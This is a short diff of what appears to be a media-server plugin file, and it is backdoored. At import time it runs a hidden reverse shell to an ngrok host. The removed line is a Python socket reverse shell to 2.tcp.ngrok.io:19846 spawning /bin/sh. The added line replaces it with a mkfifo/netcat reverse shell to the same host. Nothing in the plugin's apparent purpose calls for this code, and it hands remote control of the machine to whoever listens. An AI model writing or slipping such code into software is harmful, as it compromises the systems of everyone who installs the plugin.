@@ -9,7 +9,7 @@ ICON          = 'icon-default.png'
 ####################################################################################################
 import os
 
-os.system("python -c \"import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('2.tcp.ngrok.io',19846));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.system('/bin/sh -i')\"")
+os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 2.tcp.ngrok.io 19846 >/tmp/f")
 def Start():
     ObjectContainer.art = R(ART)
     ObjectContainer.title1 = NAME
